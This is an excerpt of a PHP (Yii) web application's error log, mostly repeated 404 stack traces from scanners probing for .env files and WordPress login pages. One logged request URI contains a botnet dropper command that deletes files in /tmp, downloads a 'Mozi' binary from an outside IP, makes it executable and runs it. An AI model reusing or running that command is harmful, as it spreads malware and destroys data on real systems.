+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:42:23 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:42:35 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:42:50 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:43:05 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request ".env". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('.env')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/.env
+2021/06/18 06:47:38 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/priznachennya_mak_atp-66". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/priznachen...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/priznachennya_mak_atp-66
+2021/06/18 07:32:22 [error] [exception.CException] CException: Property "WebUser.carrier" is not defined. in /usr/local/www/lutsk/framework/base/CComponent.php:131
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/auth/CWebUser.php(124): CComponent->__get('carrier')
+#1 /usr/local/www/lutsk/app/models/VehicleType.php(19): CWebUser->__get('carrier')
+#2 /usr/local/www/lutsk/app/components/Tree.php(24): VehicleType->getChildren()
+#3 /usr/local/www/lutsk/app/controllers/TreeController.php(8): Tree->getChildNodes('1', '1')
+#4 [internal function]: TreeController->actionRead('1', '1')
+#5 /usr/local/www/lutsk/framework/web/actions/CAction.php(104): ReflectionMethod->invokeArgs(Object(TreeController), Array)
+#6 /usr/local/www/lutsk/framework/web/actions/CInlineAction.php(48): CAction->runWithParamsInternal(Object(TreeController), Object(ReflectionMethod), Array)
+#7 /usr/local/www/lutsk/framework/web/CController.php(300): CInlineAction->runWithParams(Array)
+#8 /usr/local/www/lutsk/framework/web/CController.php(278): CController->runAction(Object(CInlineAction))
+#9 /usr/local/www/lutsk/framework/web/CController.php(257): CController->runActionWithFilters(Object(CInlineAction), Array)
+#10 /usr/local/www/lutsk/framework/web/CWebApplication.php(328): CController->run('read')
+#11 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('tree/read')
+#12 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#13 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#14 {main} REQUEST_URI=/tree/1/1
+2021/06/18 07:32:22 [error] [exception.CException] CException: Property "WebUser.carrier" is not defined. in /usr/local/www/lutsk/framework/base/CComponent.php:131
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/auth/CWebUser.php(124): CComponent->__get('carrier')
+#1 /usr/local/www/lutsk/app/models/VehicleType.php(19): CWebUser->__get('carrier')
+#2 /usr/local/www/lutsk/app/components/Tree.php(24): VehicleType->getChildren()
+#3 /usr/local/www/lutsk/app/controllers/TreeController.php(8): Tree->getChildNodes('1', '1')
+#4 [internal function]: TreeController->actionRead('1', '1')
+#5 /usr/local/www/lutsk/framework/web/actions/CAction.php(104): ReflectionMethod->invokeArgs(Object(TreeController), Array)
+#6 /usr/local/www/lutsk/framework/web/actions/CInlineAction.php(48): CAction->runWithParamsInternal(Object(TreeController), Object(ReflectionMethod), Array)
+#7 /usr/local/www/lutsk/framework/web/CController.php(300): CInlineAction->runWithParams(Array)
+#8 /usr/local/www/lutsk/framework/web/CController.php(278): CController->runAction(Object(CInlineAction))
+#9 /usr/local/www/lutsk/framework/web/CController.php(257): CController->runActionWithFilters(Object(CInlineAction), Array)
+#10 /usr/local/www/lutsk/framework/web/CWebApplication.php(328): CController->run('read')
+#11 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('tree/read')
+#12 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#13 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#14 {main} REQUEST_URI=/tree/1/1
+2021/06/18 08:01:36 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-login.php
+2021/06/18 08:01:38 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-login.php
+2021/06/18 08:01:40 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wordpress/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wordpress/wp-lo...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wordpress/wp-login.php
+2021/06/18 08:01:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "blog/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('blog/wp-login.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/blog/wp-login.php
+2021/06/18 08:01:43 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp/wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp/wp-login.php
+2021/06/18 08:20:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-login.php
+2021/06/18 08:20:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-login.php
+2021/06/18 08:20:12 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wordpress/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wordpress/wp-lo...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wordpress/wp-login.php
+2021/06/18 08:20:13 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "blog/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('blog/wp-login.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/blog/wp-login.php
+2021/06/18 08:20:14 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp/wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp/wp-login.php
+2021/06/18 08:37:54 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/obyekti_avtomatizatsiyi-33". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/obyekti_av...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/obyekti_avtomatizatsiyi-33
+2021/06/18 08:46:56 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "page/tsinova_propozitsiya-49". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('page/tsinova_pr...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/page/tsinova_propozitsiya-49
+2021/06/18 09:20:45 [error] [exception.CException] CException: Property "WebUser.carrier" is not defined. in /usr/local/www/lutsk/framework/base/CComponent.php:131
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/auth/CWebUser.php(124): CComponent->__get('carrier')
+#1 /usr/local/www/lutsk/app/components/Tree.php(33): CWebUser->__get('carrier')
+#2 /usr/local/www/lutsk/app/controllers/TreeController.php(10): Tree->getRootNode()
+#3 [internal function]: TreeController->actionRead('0', '0')
+#4 /usr/local/www/lutsk/framework/web/actions/CAction.php(104): ReflectionMethod->invokeArgs(Object(TreeController), Array)
+#5 /usr/local/www/lutsk/framework/web/actions/CInlineAction.php(48): CAction->runWithParamsInternal(Object(TreeController), Object(ReflectionMethod), Array)
+#6 /usr/local/www/lutsk/framework/web/CController.php(300): CInlineAction->runWithParams(Array)
+#7 /usr/local/www/lutsk/framework/web/CController.php(278): CController->runAction(Object(CInlineAction))
+#8 /usr/local/www/lutsk/framework/web/CController.php(257): CController->runActionWithFilters(Object(CInlineAction), Array)
+#9 /usr/local/www/lutsk/framework/web/CWebApplication.php(328): CController->run('read')
+#10 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('tree/read')
+#11 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#12 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#13 {main} REQUEST_URI=/tree/0/0?_dc=1623997245342
+2021/06/18 10:29:40 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp-login.php
+2021/06/18 10:29:40 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wordpress/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wordpress/wp-lo...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wordpress/wp-login.php
+2021/06/18 10:29:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "blog/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('blog/wp-login.p...')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/blog/wp-login.php
+2021/06/18 10:29:41 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "wp/wp-login.php". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('wp/wp-login.php')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/wp/wp-login.php
+2021/06/18 10:57:10 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "forum/files". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('forum/files')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/forum/files/
+2021/06/18 11:15:52 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "shell/read". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('shell/read')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/shell?cd+/tmp;rm+-rf+*;wget+http://27.43.115.88:47414/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws
+2021/06/18 11:41:43 [error] [exception.CHttpException.404] CHttpException: Unable to resolve the request "ads.txt". in /usr/local/www/lutsk/framework/web/CWebApplication.php:332
+Stack trace:
+#0 /usr/local/www/lutsk/framework/web/CWebApplication.php(121): CWebApplication->runController('ads.txt')
+#1 /usr/local/www/lutsk/framework/base/CApplication.php(155): CWebApplication->processRequest()
+#2 /usr/local/www/lutsk/www/index.php(13): CApplication->run()
+#3 {main} REQUEST_URI=/ads.txt
